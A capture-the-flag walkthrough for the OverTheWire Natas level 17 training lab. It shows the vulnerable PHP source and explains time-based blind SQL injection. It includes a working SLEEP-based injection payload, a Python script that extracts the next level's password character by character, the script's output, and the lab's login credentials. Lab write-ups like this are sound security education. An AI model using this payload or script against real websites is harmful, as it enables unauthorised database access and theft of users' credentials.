# Natas Level 17

> Username: natas17

> Password: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx

> URL: http://natas17.natas.labs.overthewire.org

## Solution

Entering the URL, we found something like the `level 15`, So let's view the source code to see the difference.

```php
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The different thing now is there is no message shows us if the user exists or not.

We know the code is vulnerable to `SQL Injection` and there is no true/false conditions. So this is called `Time-Based Blind SQL Injection`.

In this case we use the `SLEEP() Function` this tells the database to pause for approximately three seconds before continuing.
We can also combine it with an SQL condition: `SELECT IF(1=1, SLEEP(3), 0);`
This lets us turn the database's response time into a true/false signal.

So let's try it by using `natas18" AND SLEEP(3) #`. This help us to see if the user `natas 18` exists or not, if he exists the respond will be slower.

Now to find the password we got to go letter by letter. And say if the password starts with `a` sleep 3 seconds, if not don't sleep. 
Here is the payload:

```text
natas18" AND IF(BINARY password LIKE "a%", SLEEP(3), 0) #
```

Now let's write the script to automate the process.

```python
import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()
session.auth = auth

for position in range(32):
    for char in characters:
        guess = password + char

        payload = (
            f'natas18" AND IF('
            f'BINARY password LIKE "{guess}%",'
            f'SLEEP(3),0) #'
        )

        start = time.perf_counter()

        response = session.get(
            url,
            params={"username": payload},
            timeout=10
        )

        elapsed = time.perf_counter() - start

        if elapsed > 2.5:
            password += char
            print(f"Found: {password}")
            break
    else:
        print("No matching character found.")
        break

print("Password:", password)
```

Running it we will have something like:

```text
Found: f
Found: fD
Found: fDG
Found: fDGn
Found: fDGn2
Found: fDGn2A
Found: fDGn2A6
Found: fDGn2A6G
Found: fDGn2A6Gs
Found: fDGn2A6Gsc
Found: fDGn2A6Gsc0
Found: fDGn2A6Gsc0B
Found: fDGn2A6Gsc0BU
Found: fDGn2A6Gsc0BUp
Found: fDGn2A6Gsc0BUp3
Found: fDGn2A6Gsc0BUp3b
Found: fDGn2A6Gsc0BUp3bZ
Found: fDGn2A6Gsc0BUp3bZw
Found: fDGn2A6Gsc0BUp3bZw0
Found: fDGn2A6Gsc0BUp3bZw0R
Found: fDGn2A6Gsc0BUp3bZw0RN
Found: fDGn2A6Gsc0BUp3bZw0RNX
Found: fDGn2A6Gsc0BUp3bZw0RNXp
Found: fDGn2A6Gsc0BUp3bZw0RNXpg
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0P
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZ
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt4
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40o
Found: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
Password: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

```text
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

